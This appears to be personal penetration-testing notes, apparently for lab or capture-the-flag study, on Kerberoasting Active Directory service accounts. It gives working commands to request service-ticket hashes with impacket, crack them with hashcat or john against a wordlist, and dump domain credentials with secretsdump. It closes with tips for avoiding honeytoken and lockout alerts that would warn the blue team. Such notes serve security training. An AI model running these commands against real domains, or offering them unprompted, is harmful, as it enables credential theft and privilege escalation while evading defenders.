Ad user requests a TGT (ticket granting ticket) to access a service on a specified server

DC sends the TGT ticket back

User requests a TGS (ticket granting service) to access a specific service or server using kerberos

AD user sends TGS to specified server

Server sends back service specific information

`impacket-GetUserSPNs domain/user:pw -dc-ip $DCIP -request`

If this doesn't work because of a time sync error do the following `sudo ntpupdate $DCIP`

Once you copy over the hashes you can save to a file you can use hashcat or john
``` sh
# Using Hashcat 13100 
hashcat -m 13100 hash.hash /usr/share/wordlist/rockyou.txt

# Using John (Autodetects)
john --wordlist=/usr/share/wordlist/rockyou.txt hash.hash
```

PS. If its RC4 or AES 17/18 RC4 Is much faster to crack

If it says no SPNs found that means there are no service accounts

When to use Kerberoasting

When there are svc accounts that will more than likely have high priviliges 

Type 23 RC4 Type 17/18 AES Encryption 


After you kerberoast and or get admin 
`secretsdump.py -user-status -history -pwd-last-set administrator.htb/user@dcip`

Things to look out for

Honeytokens TEMP-ADMIN-SERVICE hasn't been logged into for 3 years or more it might likely alert the blue team as soon as your request the ticket

Account lockout: if you try to use a guessed password too many times it'll trigger an alert

